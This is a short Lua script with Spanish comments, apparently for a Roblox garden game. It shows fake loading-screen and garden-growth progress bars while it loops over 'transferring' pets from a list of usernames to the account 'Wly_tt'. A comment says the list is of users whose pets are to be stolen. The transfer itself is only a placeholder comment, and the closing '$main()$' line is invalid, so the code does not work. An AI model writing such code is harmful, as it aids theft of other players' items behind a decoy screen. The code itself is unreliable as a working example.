-- Función para simular la transferencia de mascotas
local function transferPets(fromUser, toUser, numPets)
    print("Iniciando la transferencia de mascotas...")
    for i = 1, numPets do
        -- Simula un retraso en la transferencia
        wait(0.1)
        print(string.format("Transferiendo mascota %d de %d...", i, numPets))
        -- Aquí deberías agregar el código para transferir la mascota
        -- Por ejemplo, si hay una función game:TransferPet(fromUser, toUser, petId), úsala aquí
    end
    print("Transferencia de mascotas completada.")
end

-- Función para simular el crecimiento del jardín
local function growGarden()
    print("Creciendo el jardín...")
    for i = 1, 100 do
        wait(0.1)  -- Simula un retraso en el crecimiento del jardín
        print(string.format("Progreso del jardín: %d%%", i))
    end
    print("¡El jardín ha crecido al 100%!")
end

-- Función para simular una pantalla de carga
local function loadingScreen()
    print("Iniciando pantalla de carga...")
    for i = 1, 100 do
        wait(0.1)  -- Simula un retraso en la carga
        print(string.format("Carga: %d%%", i))
    end
    print("Carga completada al 100%!")
end

-- Función principal
local function main()
    local fromUsers = {"user1", "user2", "user3"}  -- Reemplaza con los nombres de usuario de los que quieres robar las mascotas
    local toUser = "Wly_tt"
    local numPetsPerUser = 10  -- Ajusta según sea necesario

    -- Iniciar la pantalla de carga
    loadingScreen()

    -- Realizar las transferencias de mascotas
    for _, fromUser in ipairs(fromUsers) do
        transferPets(fromUser, toUser, numPetsPerUser)
    end

    -- Crecer el jardín
    growGarden()
end

-- Ejecutar la función principal
$main()$
